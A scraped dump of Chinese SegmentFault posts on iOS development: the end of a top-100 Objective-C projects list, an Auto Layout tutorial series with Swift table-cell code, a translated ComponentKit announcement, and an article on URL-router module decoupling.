<td>92. <a rel=""nofollow"" href=""https://github.com/vfr/Reader"">Reader</a>
</td>
  <td>一款开源的 iOS PDF 阅读器, 附带书签, 列纲要等功能</td>
</tr>
<tr>
<td>93. <a rel=""nofollow"" href=""https://github.com/marcuswestin/WebViewJavascriptBridge"">WebViewJavascriptBridge</a>
</td>
  <td>一个方便使用 Objective-C 与 JavaScript 进行通信的第三方库, 支持消息发送, 接收, 消息处理器的注册与调用以及设置消息处理的回调</td>
</tr>
<tr>
<td>94. <a rel=""nofollow"" href=""https://github.com/shu223/iOS8-Sampler"">iOS8-Sampler</a>
</td>
  <td>iOSX-Sampler 系列之一, 整合演示了多个具有 iOS8 新特性的的项目, 提供了非常多的例子参考</td>
</tr>
<tr>
<td>95. <a rel=""nofollow"" href=""https://github.com/robbiehanson/CocoaHTTPServer"">CocoaHTTPServer</a>
</td>
  <td>一个用于 Mac OS X 或 iOS 应用的轻量级、可嵌入的HTTP 服务器框架, 方便开发者在应用中嵌入一个 HTTP 服务器</td>
</tr>
<tr>
<td>96. <a rel=""nofollow"" href=""https://github.com/rsms/kod"">Kod</a>
</td>
  <td>Mac OS X 上一款专为程序员打造的编辑器, 这是其开源代码, 可惜的是作者在 2011 年停止了维护</td>
</tr>
<tr>
<td>97. <a rel=""nofollow"" href=""https://github.com/michaeltyson/TPKeyboardAvoiding"">TPKeyboardAvoiding</a>
</td>
  <td>下拉键盘在 iOS 移动文本字段的通用解决方案, 能够自动处理键盘弹出后出现遮挡到文本输入框的问题</td>
</tr>
<tr>
<td>98. <a rel=""nofollow"" href=""https://github.com/MugunthKumar/MKNetworkKit"">MKNetworkKit</a>
</td>
  <td>一个轻量级网络请求框架, 完全基于 ARC, 仅有两个类, 具有自主操作多个网络请求, 更加准确的显示网络活动指标等优点</td>
</tr>
<tr>
<td>99. <a rel=""nofollow"" href=""https://github.com/pkluz/PKRevealController"">PKRevealController</a>
</td>
  <td>一个 iOS 平台上的视图控制器集合, 通过展现多个视图控制器来进行控制器之间的切换. 设置简单, 高度灵活</td>
</tr>
<tr>
<td>100. <a rel=""nofollow"" href=""https://github.com/AlanQuatermain/AQGridView"">AQGridView</a>
</td>
  <td>一个命令行工具, 通过项目里的 <code>.xcdatamodel</code> 文件, 可以为每个 entity 生成两个类, 方便 CoreData 的使用</td>
</tr>
</tbody>
</table>

                ", GitHub 上排名前 100 的 Objective-C 项目简介,1531972124,274,1,607,1,1,https://segmentfault.com/a/1190000002665904
157,1,0,6,"
                    
<blockquote>
  <p>此系列文章代码仓库在 <a rel=""nofollow"" href=""https://github.com/johnlui/AutoLayout"">https://github.com/johnlui/AutoLayout</a> ，有不明白的地方可以参考我的 Auto Layout 设置哦，下载到本地打开就可以了。</p>
</blockquote>

<h2>简介</h2>

<p>本篇中我们将尝试自定义一个 UITableViewCell，并使用 Auto Layout 对其进行约束。</p>

<h2>自定义 cell 基础</h2>

<p>在前面的项目中，我们采用 StoryBoard 来组织页面，StoryBoard 可以视为许多个 xib 的集合，所以我们可以得到两个信息：</p>

<ol>
<li>这个项目通过初始化主 StoryBoard 文件来展现 APP，而 UIViewController 类文件是通过 StoryBoard 文件的绑定来初始化并完成功能的。</li>
<li>我们可以创建新的 StoryBoard 文件或者新的 xib 文件来构造 UI，然后动态地加载进页面。</li>
</ol>
<h2>创建文件</h2>

<p>我们可以一次性创建 xib 文件和类的代码文件。</p>

<p>新建 Cocoa Touch Class：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/785b1427040262.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>设置和下图相同即可：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/51991427040262.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>检查成果</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/d0c11427040579.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>分别选中上图中的 1、2 两处，检查 3 处是否已经自动绑定为 firstTableViewCell，如果没有绑定，请先检查选中的元素确实是 2，然后手动绑定即可。</p>

<h2>完成绑定工作</h2>

<p>切换一页，如下图进行 Identifier 设置：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/ebd11427040578.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>新建 Table View Controller 页面</h2>

<p>新建一个 Table View Controller 页面，并把我们之前创建的 Swift on iOS 那个按钮的点击事件绑定过去，我们得到：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/30141427042056.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>然后创建一个名为 firstTableViewController 的 UITableViewController 类，创建流程跟前面基本一致。不要创建 xib。然后选中 StoryBoard 中的 Table View Controller（选中之后有蓝色边框包裹），在右侧对它和 firstTableViewController 类进行绑定：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/d3051427042056.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>调用自定义 cell</h2>

<p>修改 firstTableViewController 类中的有效代码如下：</p>

<pre><code>swift</code><code><br>import UIKit

class firstTableViewController: UITableViewController {

    override func viewDidLoad() {
        super.viewDidLoad()

        var nib = UINib(nibName: ""firstTableViewCell"", bundle: nil)
        self.tableView.registerNib(nib, forCellReuseIdentifier: ""firstTableViewCell"")
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
    }

    // MARK: - Table view data source

    override func numberOfSectionsInTableView(tableView: UITableView) -&gt; Int {
        return 1
    }

    override func tableView(tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int {
        return 10
    }

    override func tableView(tableView: UITableView, cellForRowAtIndexPath indexPath: NSIndexPath) -&gt; UITableViewCell {
        let cell = tableView.dequeueReusableCellWithIdentifier(""firstTableViewCell"", forIndexPath: indexPath) as firstTableViewCell

        cell.textLabel?.text = indexPath.row.description

        return cell
    }
}
</code></pre>

<p>viewDidLoad() 中添加的两行代码是载入 xib 的操作。最下面的三个 func 分别是定义：</p>

<ol>
<li>self.tableView 中有多少个 section</li>
<li>每个 section 中分别有多少个条目</li>
<li>实例化每个条目，提供内容</li>
</ol>
<h3>如果你得到以下页面，说明你调用自定义 cell 成功了！</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/d52f1427044800.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>给自定义 cell 添加元素并使用 Auto Layout 约束</h2>

<p>首先向 Images.xcassets 中随意加入一张图片。</p>

<p>然后在左侧文件树中选中 firstTableViewCell.xib，从右侧组件库中拖进去一个 Image View，并且在右侧将其尺寸设置如下图右侧：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/240f1427044800.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>给 ImageView 添加约束：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/dd1d1427044800.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>选中该 ImageView（左箭头所示），点击自动 Auto Layout（右箭头所示），即可。</p>

<p>给 ImageView 设置图片：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/9bd01427044799.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>再从右侧组件库中拖入一个 UILabel，吸附到最右侧，垂直居中，为其添加自动约束，这一步不再赘述。</p>

<h2>在 firstTableViewCell 类中绑定 xib 中拖进去的元素</h2>

<p>选中 firstTableViewCell.xib，切换到双视图，直接进行拖动绑定：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/298d1427044799.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>绑定完成！</p>

<h2>约束 cell 的高度</h2>

<p>在 firstTableViewController 中添加以下方法：</p>

<pre><code>swift</code><code>override func tableView(tableView: UITableView, heightForRowAtIndexPath indexPath: NSIndexPath) -&gt; CGFloat {
    return 50
}
</code></pre>

<h2>给自定义的 UILabel 添加内容</h2>

<p>修改 firstTableViewController 中以下函数为：</p>

<pre><code>swift</code><code>override func tableView(tableView: UITableView, cellForRowAtIndexPath indexPath: NSIndexPath) -&gt; UITableViewCell {
    let cell = tableView.dequeueReusableCellWithIdentifier(""firstTableViewCell"", forIndexPath: indexPath) as firstTableViewCell

    cell.firstLabel.text = indexPath.row.description

    return cell
}
</code></pre>

<h2>查看结果</h2>

<p>4.0 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/53e11427044932.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.7 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/13b81427044798.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>如果你得到以上结果，那么恭喜你自定义 cell 并使用 Auto Layout 成功！</h3>

<blockquote>
  <p>下一步：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/442.html"">Auto Layout 使用心得（四）—— 22 行代码实现拖动回弹</a></p>
</blockquote>

<hr>
<p>原文发表在我的个人网站：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/441.html"">Auto Layout 使用心得（三）—— 自定义 cell 并使用 Auto Layout</a></p>

<hr>

                ", Auto Layout 使用心得（三）—— 自定义 cell 并使用 Auto Layout,1531972125,235,1,968,1,1,https://segmentfault.com/a/1190000002661316
158,1,0,6,"
                    
<blockquote>
  <p>此系列文章代码仓库在 <a rel=""nofollow"" href=""https://github.com/johnlui/AutoLayout"">https://github.com/johnlui/AutoLayout</a> ，有不明白的地方可以参考我的 Auto Layout 设置哦，下载到本地打开就可以了。</p>
</blockquote>

<h2>准备</h2>

<p>上一篇文章中，我们共同进行了 Auto Layout 的初体验，在本篇我们将一起尝试用 Auto Layout 实现三等分。</p>

<h2>Auto Layout 的本质原理</h2>

<p>Auto Layout 的本质是用一些约束条件对元素进行约束，从而让他们显示在我们想让他们显示的地方。</p>

<p>约束主要分为以下几种（欢迎补充）：</p>

<ol>
<li>相对于父 view 的约束。如：距离上边距 10，左边距 10。</li>
<li>相对于前一个元素的约束。如：距离上一个元素 20，距离左边的元素 5 等。</li>
<li>对齐类约束。如：跟父 view 左对齐，跟上一个元素居中对齐等。</li>
<li>相等约束。如：跟父 view 等宽。</li>
</ol>
<h3>三等分设计思路</h3>

<p>许多人刚开始接触 Auto Layout，可能会以为它只能实现上面的1、2功能，其实后面3、4两个功能才是强大、特别的地方。接下来我们将尝试设计横向三等分：</p>

<ol>
<li>第一个元素距离左边一定距离。</li>
<li>最后一个元素距离右边一定距离。</li>
<li>三者高度恒定，宽度相等。</li>
<li>1和2、2和3的横向间距固定。</li>
</ol>
<h3>干货，实现过程的动图：</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/b5e91425647800.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>运行结果</h3>

<p>4 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/20371425646865.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.7 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/da191425646867.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>纵向三等分实现方式类似，大家可以自己尝试一下哦~</h3>

<blockquote>
  <p>下一步：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/441.html"">Auto Layout 使用心得（三）—— 自定义 cell 并使用 Auto Layout】</a></p>
</blockquote>

<hr>
<p>原文发表在我的个人网站：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/431.html"">Auto Layout 使用心得（二）—— 实现三等分</a></p>

<hr>

                ", Auto Layout 使用心得（二）—— 实现三等分,1531972127,229,1,113,1,1,https://segmentfault.com/a/1190000002661302
159,1,0,6,"
                    
<p><strong>本系列文章将从一个慢慢摸索中的新手的角度介绍 Auto Layout，讲述我在这两个月的学习中对它一点一滴的感受，最终目的是让大家在阅读完之后能够自己上手使用，并完成绝大多数简单的布局约束。</strong></p>

<blockquote>
  <p>此系列文章代码仓库在 <a rel=""nofollow"" href=""https://github.com/johnlui/AutoLayout"">https://github.com/johnlui/AutoLayout</a> ，有不明白的地方可以参考我的 Auto Layout 设置哦，下载到本地打开就可以了。</p>
</blockquote>

<h2>简介</h2>

<p>Auto Layout 是苹果在 Xcode 5 (iOS 6) 中新引入的布局方式，旨在解决 3.5 寸和 4 寸屏幕的适配问题。屏幕适配工作在 iPhone 6 及 plus 发布以后变得更加重要，而且以往的“笨办法”的工作量大幅增加，所以很多人开始学习使用 Auto Layout 技术。</p>

<h2>初体验</h2>

<h3>0. 开发环境</h3>

<p>本系列文章的开发环境为：</p>

<ul>
<li>OS X 10.10.2</li>
<li>Xcode Version 6.2 (6C131e)</li>
</ul>
<h3>1. 新建应用</h3>

<p>新建一个 Single View Application，命名为 AutoLayout，如下：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201502/310e1424793628.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>点击选中 Main.storyboard，右侧内容如下：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201502/fb801424793884.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>1、2 两个按钮将会在未来的开发中产生巨大的作用，他们将拥有本系列文章的全局名称：按钮1，按钮2。请先记下他们的位置。</p>

<h3>2. 直接上手，开始使用</h3>

<p>这也是我对学习新的软件编程技术的基本学习方法：有一个具体客观驱动的目标，例如做一个真正要给客户用的软件，而不是“为了学习新技术提高自己”这类伪目标。</p>

<p>让我们直接上手：绘制一个距离左右边都有一定距离、固定高度、垂直居中的按钮，叫“Swift on iOS”。</p>

<ol>
<li><p>第一步，从右侧拖过来一个按钮，置于页面最中间。会有参考线出现，这一步很容易：<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/02df1425455988.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p></li>
<li><p>选中这个 button，将按钮背景色和前景色进行如下设置：<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/c6c31425455986.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p></li>
<li><p>将按钮左侧边界往左拖动直到自动吸附，留下一定的距离。右侧进行同样操作：<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/c7a51425455980.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p></li>
<li><p>选中这个 button，修改文字为 Swift on iOS:<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/46e91425455978.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p></li>
<li><p>选中这个 button，点击 按钮2 ，选择这一项：<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/98691425455976.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p></li>
</ol>
<p>这时候 button 周围会出现一些蓝色的线条，这些就是 Auto Layout 的约束项。</p>

<h3>3. 大功告成，查看效果</h3>

<p>3.5:<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/3c361425455970.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4:<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/33131425455968.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.7:<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/5d7d1425456707.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>5.5:<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/46a61425456710.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>4. 分析</h3>

<p>选中这个 button，在右侧查看自动生成的约束项：<br><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/cd191425455962.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>只有三项，这三项的意思分别是：和父视图纵向居中对齐、右侧和父视图对齐、左侧和父视图对齐。</p>

<blockquote>
  <p>我们很容易就能理解这样可以定位一个按钮，但是总感觉少了点什么。实际上这三个自动生成的约束项并不能描述一个 button 的位置，因为少了一个关键的属性：button 的高度。以后我们会详细地讨论。</p>
</blockquote>

<h2>核心思想</h2>

<h3>本质分析</h3>

<p>Auto Layout 的本质是依靠 <strong><em>某几项约束条件</em></strong> 来达到对某一个元素的定位。我们可以在某个地方只使用一个约束，以达到一个小目的，例如防止内容遮盖、防止边界溢出等。但我的最佳实践证明，如果把页面上每一个元素的位置都用 Auto Layout 进行 <strong><em>“严格约束”</em></strong> 的话，那么 Auto Layout 可以帮我们省去非常多的计算 frame 的代码。</p>

<h3>“严格约束” 是什么？</h3>

<p>简单来说，严格约束就是对某一个元素的绝对定位，让它在任一屏幕尺寸下都有着唯一的位置。这里的绝对定位不是定死的位置，而是对一个元素 <strong><em>完善的约束条件</em></strong>。</p>

<p><em>让我们看图说话：</em></p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201503/8bfd1425457660.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<ol>
<li>我们要在一个直角坐标系里描述一个矩形。</li>
<li>那么只需要指定这个矩形的位置和大小。</li>
<li>那么只要给出上图中的四个值即可：到左边界的距离，到上边界的距离，宽度，高度。</li>
<li>这四个约束是最简单的情况。在对一个元素进行严格约束时，请直接在脑中构建这个元素，并且加上几条约束条件，如果他无法缩放和动弹，那么严格约束就是成功的！</li>
<li>必须牢记，使用 Auto Layout 时最重要的是：对页面上每一个元素都进行严格约束，不严格的约束是万恶之源。</li>
</ol>
<blockquote>
  <p>下一步：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/431.html"">Auto Layout 使用心得（二）—— 实现三等分</a></p>
</blockquote>

<hr>
<p>原文发表在我的个人网站：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/430.html"">Auto Layout 使用心得（一）—— 初体验</a></p>

<hr>

                ", Auto Layout 使用心得（一）—— 初体验,1531972129,401,1,80,1,1,https://segmentfault.com/a/1190000002661195
160,1,0,6,"
                    
<blockquote>
  <p>Facebook 昨天发布了他们的 iOS UI 开发工具 - ComponentKit，这是一个受 React 启发而产生的 iOS 视图框架，最开始用于 Facebook 的 News Feed，现在已经开始作为整个 Facebook 的 iOS 开发工具。今天我把他们官方的介绍博客翻译一下，大家互相交流。以下是博客原文全译。</p>
</blockquote>

<hr>
<p>在 iOS 上面开发界面，需要创建视图、配置界面、视图分层等等很多步骤，也就不可避免的需要书写 N 多的代码。这还仅仅是界面设计，除此之外，完成 controllers 的回调、控制内部事务在界面上的显示效果、界面的操控和内部事务的联系等等多方面的事情都需要手动解决。即便是界面很简单的 App，如果存在这种复杂的双向数据流的关系，那么代码也会变得很复杂很容易出错。Qt 的信号、槽和 iOS 的 Target-Action 机制其实也是很容易实现这种双向数据流的关系，但是没有办法解决界面和事务之间的联系，也有很多其他的问题：性能、测试等。</p>

<p>这些问题曾经困扰了我们多年。News Feed 是有着复杂的列表样式外观的 iOS 软件，由许多的 Row Type 组成，每一个 Row 都有各种各样不同的很烦的界面样式和交互方式，这个就很坑了。每次维护这个东西都像是在清理厕所，尤其是它的功能还在不断增加，它的代码在不断变多，版本迭代速度快到你都没办法直到每天都到底增添了什么新代码，上司还要拿着报告说“你这个软件太慢了，影响用户体验，给你三个小时把这个 App 的速度提高 80%”。</p>

<p>为了解决这一挑战性的问题，我们从自己的 <a rel=""nofollow"" href=""https://code.facebook.com/projects/176988925806765/react/"">ReactJS</a> 得到启发，把很多具体的东西抽象出来，做出一个功能性的、响应式编程模型的 iOS 原生 UI 框架 <a rel=""nofollow"" href=""http://github.com/facebook/componentkit"">ComponentKit</a>，目前 News Feed 在应用这个框架。</p>

<p>现在 ComponentKit 将基于 BSD 协议对外开源。</p>

<h2>ComponentKit 简介</h2>

<p>ComponentKit 使用功能性和声明性（declarative）的方法来进行创建界面，和以往不同的是，ComponentKit 使用单向数据流的形式从 <a rel=""nofollow"" href=""https://code.facebook.com/posts/340384146140520/making-news-feed-nearly-50-faster-on-ios/"">不可变的模型</a> 映射到不可变的组件来确定视图的显示方式。ComponentKit 的 declarative 看上去和 declarative UI(QML) 差不多，其实差得远。QML 更偏向于 UI 设计的描述性，而 ComponentKit 则是做好基本 UI 和事件之间的联系，让事件设计和 UI 设计可以分开单独完成。</p>

<p>内在决定外在，组件的功能和内部的层次决定了用户界面该如何规划，界面的规划决定了 UI Kit 的元素层次结构的设计。</p>

<p><span class=""img-wrap""><img data-src=""/img/bVlbaX"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png""></span></p>

<p>传统做法的结果是大部分时间都被浪费在 UI 该如何实现，ComponentKit 却可以让你把时间都用在在 UI 该怎么设计上面。</p>

<p>例如，传统的 iOS 开发中，为了开发一个带有 header、text 和 footer 的视图，需要以下步骤：</p>

<ol>
<li>分别创建 header 视图、text 视、footer 视图的实例</li>
<li>将三个视图添加为 container 的子视图</li>
<li>添加约束条件，让每个视图和 container 的宽度相同</li>
<li>添加更多的约束条件，确保每个视图的摆放位置</li>
</ol>
<p>但是 ComponentKit 不一样，ComponentKit 是一种描述性的开发包：你只需要提供<strong>你希望得到什么</strong>便能得到什么，而不和传统的 iOS 开发一样，再去一个一个地创建视图、修改视图样式、添加视图、添加约束条件。如图所示，想要得到这个布局，只需要使用描述性的语言描述“我想要一个 header 组件，一个 text 组件，一个 footer 组件，他们的宽度相同，从上到下排列在一起”。单单从这点来看，和 QML 相比，ComponentKit 更类似于 Bootstrap：提供已经完成的组件，你只需要决定组件如何摆放，便可轻松地开发出 UI 界面。</p>

<p><span class=""img-wrap""><img data-src=""/img/bVla9Q"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png""></span></p>

<p>ComponentKit 已经完全把如何渲染 UI 的事情抽象出来，程序员完全可以不去考虑具体是如何实现渲染的，也不用去考虑界面渲染该如何优化。ComponentKit 使用后台线程进行界面布局，也实现了智能组件重用，你完全可以不去考虑界面导致的内存泄露问题。ComponentKit 不仅仅可以极大地提高开发效率，界面响应速度和软件的运行效率也会有极大地提升。</p>

<p>如果你想深入了解 ComponentKit，你可以 <a rel=""nofollow"" href=""http://www.objc.io/issue-22/facebook.html"">参考 Adam Ernst 的这篇文章</a>，也可以去看一下 <a rel=""nofollow"" href=""https://www.youtube.com/watch?v=XhXC4SKOGfQ&amp;t=24m40s"">Ari Grant 的视频的后半部分</a>。</p>

<h3>将 News Feed 移植到 ComponentKit</h3>

<p>ComponentKit 极大地提升了 News Feed 的 UI 响应速度和稳定性，也让整个软件的内部编码更容易理解。ComponentKit 达到了如下的目标：</p>

<ol>
<li>减少了 70% 的界面渲染代码，麻麻再也不用担心我每次去维护之前都要看那本又臭又长的手册然后花一上午的时间去理解那个错综复杂的布局了。</li>
<li>显著地提高了滑屏的性能。ComponentKit 消除了许多的 container 视图，尽力将所有的视图结构化简。更简洁的视图结构意味着界面的渲染性能和执行效率更高。</li>
<li>提高测试覆盖率。ComponentKit 对于 UI 模块化的设计保证了每一部分都可以被分离开来单独进行测试。再加上 <a rel=""nofollow"" href=""https://github.com/facebook/ios-snapshot-test-case"">snapshot tests</a>，我们现在几乎已经可以对 News Feed 的所有部分都进行测试了。</li>
</ol>
<p>引入了 ComponentKit 之后，我们能够维护更少的代码，有更少的 bug 需要修复，有更大的测试覆盖率：我们现在可以有更多的时间做羞羞的事情了</p>

<p>ComponentKit 已经在生产环境的 News Feed 上用了六个月，我们觉得可以一直用下去。现在将 ComponentKit 开源，让整个 iOS 开发者社区的人都有 Facebook 的生产效率，也都能和 Facebook 一样做出高性能的 App。很希望你也能在你的开发环境中使用 ComponentKit，然后给我们反馈。</p>

<p>我们重新定义了如何在 iOS 上开发界面，希望你也能用 ComponentKit 开发出更优雅的 App。</p>

<p>-<em>（译文完）</em>-</p>

<h2>快速入门</h2>

<p>ComponentKit 已经在 CocoaPods 中可用了，只需要在 Podfile 添加如下代码即可：</p>

<pre><code>pod 'ComponentKit', '~&gt; 0.9'
</code></pre>

<p>ComponentKit Demo：</p>

<pre><code>pod try ComponentKit
</code></pre>

<h3>更多资料：</h3>

<ul>
<li><a rel=""nofollow"" href=""https://github.com/facebook/componentkit"">ComponentKit GitHub</a></li>
<li><a rel=""nofollow"" href=""http://componentkit.org/docs/getting-started.html"">开发者文档</a></li>
</ul>
<hr>
<blockquote>
  <p>原文：<a rel=""nofollow"" href=""https://code.facebook.com/posts/1415586422080360/introducing-componentkit-functional-and-declarative-ui-on-ios"">Introducing ComponentKit: Functional and declarative UI on iOS</a></p>
</blockquote>

                ", ComponentKit：一个功能性的和声明性的 Facebook iOS UI 工具,1531972130,208,1,599,1,1,https://segmentfault.com/a/1190000002625560
161,1,0,6,"
                    
<p>不管是《21天学会XXX》还是《Java编程死象》，基本上所有的编程入门书都会反复跟你讲「强类聚，弱耦合」，我理解模块划分中很容易发生模块之间耦合严重。你的代码运行依赖他的代码，然后他改了个接口你的代码就没法运行了。</p>

<h3>所以...</h3>

<ul>
<li>模块要能独立编写、运行、测试</li>
<li>模块要减少对外部参数的依赖</li>
</ul>
<p>如果熟悉 Web 开发，会发现框架要工作需要你定义 Router ， Router 的作用是一个请求来了，帮这个请求找到对应的模块，接下来怎么渲染、需要显示啥，都是 Router 背后的模块的事儿了。试想 Web 开发不用任何框架，也不写 Router，一个请求过来了，会发生啥：</p>

<pre><code><br>def matchURL(url):

    if url.find('/article'):
            article = Article()

            article.articleID = 1000050
                article.title          = '铃铛和花瓶'
           return article.render()
    return 'No Match'

</code></pre>

<p>有了 Router 之后：</p>

<pre><code>urls = (
  '/article/:articleID', 'article'
)

</code></pre>

<p>Router 的本质是一个约定、一种传参规则。</p>

<p>我们遇到的问题不就是 Router 解决的么？彼此之间就不需要再关心对方的模块做了啥，需要调用对方模块的时候，只需要像 Router 要，不需要去关心对方模块到底做了啥，暴露了啥接口，这样也就解藕了。</p>

<p>其实早在远古的 Three20 时代就有运用这种思想造出的轮子：<br><a rel=""nofollow"" href=""https://github.com/alunny/three20/blob/master/src/TTNavigator.m"">https://github.com/alunny/three20/blob/master/src/TTNavigator.m</a></p>

<p>然后近代的复刻版有：<br><a rel=""nofollow"" href=""https://github.com/gaosboy/urlmanager"">https://github.com/gaosboy/urlmanager</a><br><a rel=""nofollow"" href=""https://github.com/Huohua/HHRouter"">https://github.com/Huohua/HHRouter</a><br><a rel=""nofollow"" href=""https://github.com/usepropeller/routable-ios"">https://github.com/usepropeller/routable-ios</a><br><a rel=""nofollow"" href=""https://github.com/aaronbrethorst/ABRouter"">https://github.com/aaronbrethorst/ABRouter</a></p>

<p>使用上都是像 Router 注册 URL 和对应的 Controller，然后在使用的时候忘记 Controller 创建、初始化的存在，直接向 Router 去要：</p>

<pre><code>//注册
[[HHRouter shared] map:@""/read/:userId/"" toControllerClass:ReadController.class];

//调用
[[HHRouter shared] matchController:@""/read/1/?tabIndex=3""]

</code></pre>

<p>通过这种思想，模块之间的耦合度降低了，因为彼此之间传递参数都是通过URL，Controller 也更清晰。</p>

<p>参考资料：<br><a rel=""nofollow"" href=""http://pizi.me/86"">http://pizi.me/86</a><br><a rel=""nofollow"" href=""https://github.com/gaosboy/urlmanager/"">https://github.com/gaosboy/urlmanager/</a></p>

                ", 使用 Router 思想划分模块,1531972132,591,1,700,1,1,https://segmentfault.com/a/1190000002585537
162,1,0,6,"
                    
<p>看到一份很赞的IOS学习资料，由于SF文章字数限制，分两篇分享<br>
原文 <a rel=""nofollow"" href=""http://www.jianshu.com/p/dc81698a873c"">iOS 学习资料整理</a></p>

<p>这份学习资料是为 iOS 初学者所准备的, 旨在帮助 iOS 初学者们快速找到适合自己的学习资料, 节省他们搜索资料的时间, 使他们更好的规划好自己的 iOS 学习路线, 更快的入门, 更准确的定位的目前所处的位置.</p>

<p>该文档会持续更新, 同时也欢迎更多具有丰富经验的 iOS 开发者将自己的常用的一些工具, 学习资料, 学习心得等分享上来, 我将定期筛选合并, 文档尚有一些不完善之处, 也请不吝指出, 感谢您对 iOS 所做的贡献, 让我们一起把国内的 iOS 做得更好, 谢谢.</p>

